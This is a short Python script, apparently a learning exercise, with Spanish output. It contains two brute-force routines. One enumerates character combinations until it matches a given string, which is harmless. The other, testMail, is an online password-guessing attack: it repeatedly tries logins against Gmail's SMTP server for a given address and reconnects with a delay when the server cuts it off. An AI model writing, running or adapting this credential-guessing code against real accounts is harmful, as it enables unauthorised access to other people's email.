import time
import random
from itertools import product
from tqdm import tqdm

import smtplib
import ssl


def fuerzaBruta(clave):
    print("Inicio de código de fuerza bruta, espere...")
    before = time.time()
    # asci = [chr(i) for i in range(70)]
    mayus = [
        "A",
        "B",
        "C",
        "D",
        "E",
        "F",
        "G",
        "H",
        "I",
        "J",
        "K",
        "L",
        "M",
        "N",
        "Ñ",
        "O",
        "P",
        "Q",
        "R",
        "S",
        "T",
        "U",
        "V",
        "W",
        "X",
        "Y",
        "Z",
    ]
    minus = [x.lower() for x in mayus]
    nums = [
        "0",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "+",
        "-",
        ".",
        ",",
        "*",
        "?",
    ]
    asci = mayus + minus + nums

    n = 0
    while True:

        for x in tqdm(product(asci, repeat=n)):
            attempt = "".join(x)
            if attempt == clave:
                after = time.time()
                duration = round((after - before) / 60, 3)
                print("Logrado, clave: {} en {} minutos".format(attempt, duration))
                quit()
        print(
            "la clave tiene más de {} caracteres\nSe intentará con {}".format(
                len(attempt), len(attempt) + 1
            )
        )
        n += 1


def create_conn(smtp_server, port, context):
    conn = smtplib.SMTP_SSL(smtp_server, port, context=context)
    return conn


def testMail(email):
    print("Inicio de código de fuerza bruta, espere...")

    before = time.time()

    asci = ["s", "u", "b", "a", "t", "1", "2"]

    port = 465
    smtp_server = "smtp.gmail.com"
    n = 0

    context = ssl.create_default_context()
    server = create_conn(smtp_server, port, context)
    while True:
        for x in tqdm(product(asci, repeat=n)):
            pwd = "".join(x)

            try:
                server.login(email, pwd)
                print("Contraseña Correcta: %s" % pwd)
                quit()
            except smtplib.SMTPAuthenticationError:
                continue
            except smtplib.SMTPServerDisconnected:
                print("desconectado, esperar 30 sec...")
                time.sleep(30)
                server = create_conn(smtp_server, port, context)

                continue

        print(
            "la clave tiene más de {} caracteres\nSe intentará con {}".format(
                len(pwd), len(pwd) + 1
            )
        )
        n += 1


fuerzaBruta("hola")
